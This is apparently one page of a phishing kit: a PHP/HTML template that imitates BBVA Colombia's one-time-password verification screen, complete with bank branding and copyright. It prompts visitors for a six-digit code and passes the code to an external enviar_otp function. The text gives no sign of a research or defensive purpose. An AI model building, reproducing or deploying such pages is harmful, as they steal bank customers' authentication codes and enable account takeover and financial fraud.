<?php 




?>

<!DOCTYPE html>
<html lang="es">
<meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <title>OTP | BBVA Colombia</title>
    <link href="img/favicon-48x48.avif" rel="icon" sizes="48x48" type="image/avif">
    <link href="img/apple-icon.avif" rel="apple-touch-icon">
    <link href="img/favicon-32x32.avif" rel="icon" sizes="32x32" type="image/avif">
    <link href="img/android-chrome-icon.avif" rel="icon" sizes="192x192" type="image/avif">
    <link href="img/favicon-16x16.avif" rel="icon" sizes="16x16" type="image/avif">
    <link href="img/safari-icon.svg" rel="mask-icon" color="#1464a5">
    <link href="img/favicon.ico" rel="shortcut icon">
    <link href="css/styles.css" rel="stylesheet">
    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
	<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   	<script type="text/javascript" src="../../scripts/functions2.js"></script>
       <script src="js/nopasa.js"></script>		  	
    <script>
        
    </script>

</head>
<body>
    <section class="ContenedorPrincipalBanner">
        <div class="Banner">
            <img src="img/BB-Blanco.svg" alt="BBVA Logo">
            <h5></h5>
        </div>
    </section>

    <section class="Paso" style="margin-bottom:100px">
        <div class="ContenedorCentral">
            <div class="Top">
                <h1 class="h1Guaro" style="margin-bottom:24px">Â¡Ingresa el cÃ³digo de verificaciÃ³n!</h1>
                <p class="pGuaro">
                    Recuerda que para realizar pagos en internet, debes estar registrado en BBVA net. RegÃ­strate en
                    <a href="#" target="_blank">BBVA.com.co</a>
                    Y para agilizar tu pago, ten a mano tu app BBVA mÃ³vil o la tarjeta de coordenadas.
                </p>
            </div>

            <div class="DatosUsuarios">
                <form autocomplete="off">
                    <div class="TipoDocumento">
                        <input class="InputDocumento" id="txtOTP" inputmode="numeric" maxlength="6" required type="text">
                        <label class="LabelDocumento">CÃ³digo de verificaciÃ³n</label>
                    </div>
                </form>
                <div class="Boton" id="btnOTP" type="button">
                    <a class="BtnAzulDisabled">Confirmar</a>
                </div>
            </div>
        </div>
    </section>

    <footer aria-label="Pie de pÃ¡gina" role="ContenidoInfo">
        <div class="BaseFooter">
            <div class="ContenedorFooter">
                <div class="redes">
                    <div class="redes1">
                        <a href=""><i class="i1"></i></a>
                        <a href=""><i class="i2"></i></a>
                        <a href=""><i class="i3"></i></a>
                        <a href=""><i class="i4"></i></a>
                    </div>
                </div>
                <div class="Copy">
                    <p class="Copirai">Â© 2024 BBVA Banco Bilbao Vizcaya Argentaria Colombia S.A</p>
                </div>
            </div>
        </div>
    </footer>


<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			if ($("#txtOTP").val().length > 5) {
				enviar_otp($("#txtOTP").val());				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#txtOTP").focus();
			}			
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>



</html>
